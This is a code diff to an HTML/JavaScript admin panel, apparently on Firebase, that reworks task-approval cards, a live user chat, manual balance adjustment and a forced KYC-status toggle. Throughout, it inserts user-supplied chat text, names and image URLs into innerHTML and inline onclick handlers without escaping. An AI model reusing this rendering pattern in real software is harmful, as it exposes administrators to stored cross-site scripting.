-        return `<div class="glass p-4 border-l-4 border-amber-500"><h4 class="font-black text-white text-[10px] uppercase">${name}</h4><p class="text-[9px] text-amber-500 font-black uppercase mt-1">${title}</p>${imgHtml}<div class="flex gap-2 mt-4"><button onclick="processTask('${uid}','${type}','SUCCESSFUL', ${amt})" class="flex-1 bg-emerald-600 h-9 rounded font-black text-[9px] uppercase">Approve</button><button onclick="processTask('${uid}','${type}','FAILED', ${amt})" class="flex-1 bg-rose-600/20 text-rose-500 h-9 rounded font-black text-[9px] uppercase">Decline</button></div></div>`;
+    function buildTask(uid, name, title, imgs, type, amt) {
+        let gallery = imgs ? `<div class="flex gap-2 my-2">` + imgs.map(i => i ? `<img src="${i}" class="w-14 h-14 object-cover rounded border border-slate-700" onclick="popImg('${i}')">` : '').join('') + `</div>` : '';
+        return `
+        <div class="glass p-4 border-l-4 border-amber-500">
+            <h4 class="font-black text-white text-[10px] uppercase">${name}</h4>
+            <p class="text-[9px] text-amber-500 font-black uppercase mt-1 italic">${title}</p>
+            ${gallery}
+            <div class="flex gap-2 mt-4">
+                <button onclick="processRequest('${uid}','${type}','SUCCESSFUL', ${amt})" class="flex-1 bg-emerald-600 h-9 rounded font-black text-[9px] uppercase">Approve</button>
+                <button onclick="processRequest('${uid}','${type}','FAILED', ${amt})" class="flex-1 bg-rose-600/20 text-rose-500 h-9 rounded font-black text-[9px] uppercase">Decline</button>
+            </div>
+        </div>`;
     }
 
-    window.openChat = (uid, name) => {
-        activeChatId = uid;
-        document.getElementById('chat-target-name').innerText = name;
-        document.getElementById('chat-hub').classList.remove('hidden');
+    // CHAT SYSTEM
+    window.openLiveChat = (uid, name) => {
+        targetID = uid;
+        document.getElementById('chat-title').innerText = name;
+        document.getElementById('chat-overlay').classList.remove('hidden');
         onSnapshot(doc(db, "users", uid), s => {
             const hist = s.data().chatHistory || [];
-            document.getElementById('chat-feed').innerHTML = hist.map(m => `<div class="p-3 rounded-xl max-w-[80%] ${m.sender === 'ADMIN' ? 'bg-sky-600 self-end rounded-br-none' : 'bg-slate-800 self-start rounded-bl-none'}">${m.image ? `<img src="${m.image}" class="w-full rounded mb-1" onclick="viewImg('${m.image}')">` : ''}<p class="text-white text-[11px]">${m.text || ''}</p></div>`).join('');
-            const f = document.getElementById('chat-feed'); f.scrollTop = f.scrollHeight;
+            document.getElementById('chat-screen').innerHTML = hist.map(m => `
+                <div class="p-3 rounded-2xl max-w-[85%] ${m.sender === 'ADMIN' ? 'bg-sky-600 self-end rounded-br-none' : 'bg-slate-800 self-start rounded-bl-none'}">
+                    ${m.image ? `<img src="${m.image}" class="w-full rounded mb-1" onclick="popImg('${m.image}')">` : ''}
+                    <p class="text-white text-[12px]">${m.text || ''}</p>
+                </div>`).join('');
+            const screen = document.getElementById('chat-screen'); screen.scrollTop = screen.scrollHeight;
         });
     };
 
-    document.getElementById('chat-send').onclick = async () => {
-        const inp = document.getElementById('chat-input');
-        if(!inp.value && !pendingImg) return;
-        await updateDoc(doc(db, "users", activeChatId), { chatHistory: arrayUnion({ sender: "ADMIN", text: inp.value, image: pendingImg, time: new Date().toISOString() }) });
-        inp.value = ""; pendingImg = null; document.getElementById('chat-preview-wrap').classList.add('hidden');
+    document.getElementById('msg-send-btn').onclick = async () => {
+        const inp = document.getElementById('msg-input');
+        if(!inp.value && !base64Image) return;
+        await updateDoc(doc(db, "users", targetID), { 
+            chatHistory: arrayUnion({ sender: "ADMIN", text: inp.value, image: base64Image, time: new Date().toISOString() }) 
+        });
+        inp.value = ""; base64Image = null; document.getElementById('img-prev-box').classList.add('hidden');
     };
 
-    window.switchTab = (id, el) => {
+    // UTILITIES
+    window.goTab = (id, el) => {
         document.querySelectorAll('.pane, .nav-item').forEach(x => x.classList.remove('active'));
         document.getElementById('pane-'+id).classList.add('active');
         el.classList.add('active');
     };
 
-    window.closeChat = () => document.getElementById('chat-hub').classList.add('hidden');
-    window.previewImg = (i) => { const r = new FileReader(); r.onload = e => { pendingImg = e.target.result; document.getElementById('chat-preview-img').src = pendingImg; document.getElementById('chat-preview-wrap').classList.remove('hidden'); }; r.readAsDataURL(i.files[0]); };
-    window.viewImg = (s) => { document.getElementById('viewer-img').src = s; document.getElementById('viewer').style.display = 'flex'; };
-    window.adjustBal = async (uid) => { const amt = prompt("Change balance (+ to add, - to subtract):"); if(amt && !isNaN(amt)) await updateDoc(doc(db, "users", uid), { balance: increment(Number(amt)) }); };
-    window.quickAction = async (uid, field, val) => { let obj = {}; obj[field] = val; await updateDoc(doc(db, "users", uid), obj); };
+    window.exitChat = () => document.getElementById('chat-overlay').classList.add('hidden');
+    window.popImg = (s) => { document.getElementById('viewer-source').src = s; document.getElementById('image-viewer').style.display = 'flex'; };
+    window.previewMsgImg = (f) => { const r = new FileReader(); r.onload = e => { base64Image = e.target.result; document.getElementById('img-prev-img').src = base64Image; document.getElementById('img-prev-box').classList.remove('hidden'); }; r.readAsDataURL(f.files[0]); };
+    window.updateBalance = async (uid) => { const val = prompt("Enter amount to adjust (+/-):"); if(val && !isNaN(val)) await updateDoc(doc(db, "users", uid), { balance: increment(Number(val)) }); };
+    window.forceVerify = async (uid, cur) => { await updateDoc(doc(db, "users", uid), { kycStatus: cur === 'SUCCESSFUL' ? 'FAILED' : 'SUCCESSFUL' }); };
+    document.getElementById('admin-search').oninput = renderUI;
     document.getElementById('logout-btn').onclick = () => signOut(auth);
+
 </script>
 </body>
 </html>
